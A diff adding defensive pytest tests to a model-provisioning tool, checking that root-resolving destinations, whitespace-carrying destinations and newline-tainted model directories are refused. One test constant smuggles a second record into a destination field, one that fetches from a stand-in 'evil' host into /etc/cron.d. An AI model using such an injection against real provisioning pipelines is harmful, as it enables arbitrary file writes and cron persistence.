@@ -358,3 +358,56 @@ def test_an_entry_declaring_no_sources_is_refused_by_name(tmp_path: Path) -> Non
     # an entry that offered nothing and an entry whose every offer was refused
     # are different failures with different fixes
     assert "rejected" not in decision.reason
+
+
+# `normpath` collapses each of these to `"."`, whose `.parts` is the empty tuple:
+# the models root itself, reached without ever climbing out of it.
+ROOT_ITSELF = [".", "./", "a/..", "foo/../"]
+
+
+@pytest.mark.spec(
+    "model-provisioning:immutable-pins:an-escaping-destination-is-refused"
+)
+def test_a_destination_resolving_to_the_models_root_itself_is_refused(
+    tmp_path: Path,
+) -> None:
+    # The guard's contract is that it returns a decision, and `decide` turns the
+    # unresolvable ones into `abort` with a message naming the destination. A
+    # destination that is the root rather than a file under it is not a path this
+    # may land on, and refusing it is not the same act as crashing on it.
+    for dest in ROOT_ITSELF:
+        decision = decide({**_entry(), "dest": dest}, tmp_path, FakeFetcher())
+        assert decision.action == "abort", dest
+        assert dest in decision.reason
+
+
+# The plan protocol is line- and tab-delimited, so a destination carrying either
+# does not stay one field: this one ends the record and starts a second whose
+# target is absolute and whose URL never passes `PINNED_SOURCE`, because that
+# check lives in `decide` and an injected record bypasses `decide` entirely.
+SMUGGLED = "checkpoints/a.safetensors\nFETCH\t/etc/cron.d/payload\thttp://evil/x"
+
+
+@pytest.mark.spec(
+    "model-provisioning:immutable-pins:an-escaping-destination-is-refused"
+)
+def test_a_destination_carrying_whitespace_is_refused(tmp_path: Path) -> None:
+    decision = decide({**_entry(), "dest": SMUGGLED}, tmp_path, FakeFetcher())
+    assert decision.action == "abort"
+    assert "does not resolve" in decision.reason
+
+
+@pytest.mark.spec(
+    "model-provisioning:immutable-pins:an-escaping-destination-is-refused"
+)
+def test_a_plan_line_that_would_not_stay_one_record_is_refused(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    # Defence in depth, against the half of the target the destination rule does
+    # not cover: `MODELS_DIR` is handed in by the shell, so the delimiter can
+    # arrive from the root rather than from the manifest.
+    models_dir = tmp_path / "models\nroot"
+    assert plan(_manifest([_entry([PRIMARY])]), models_dir, FakeFetcher()) == 1
+    captured = capsys.readouterr()
+    assert "FETCH" not in captured.out
+    assert "ERROR" in captured.err
